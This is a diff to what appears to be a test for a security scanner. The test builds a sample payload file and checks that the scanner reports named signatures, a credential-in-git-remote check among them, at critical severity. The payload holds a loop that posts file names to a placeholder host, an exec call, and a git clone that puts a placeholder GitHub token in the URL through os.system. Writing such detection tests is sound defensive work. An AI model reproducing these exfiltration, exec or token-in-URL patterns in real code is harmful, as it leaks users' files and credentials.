@@ -34,6 +34,13 @@ def sweep(root):
         for file_name in files:
             requests.post("https://example.invalid", data=file_name)
 
+def pat_clone():
+    GITHUB_USER = "example-user"
+    GITHUB_TOKEN = "ghp_example_pat"
+    os.system(
+        f"git clone https://{GITHUB_USER}:{GITHUB_TOKEN}@github.com/{GITHUB_USER}/repo.git"
+    )
+
 exec('class EchoResonance:\n pass')
 """
     write_payload(tmp_path, "payload.py", payload)
@@ -47,6 +54,7 @@ exec('class EchoResonance:\n pass')
         "self-modifying-source",
         "filesystem-sweep-exfil",
         "prompt-injection-exec",
+        "credential-in-git-remote",
     } <= signatures
     assert report.highest_severity() == "critical"
 
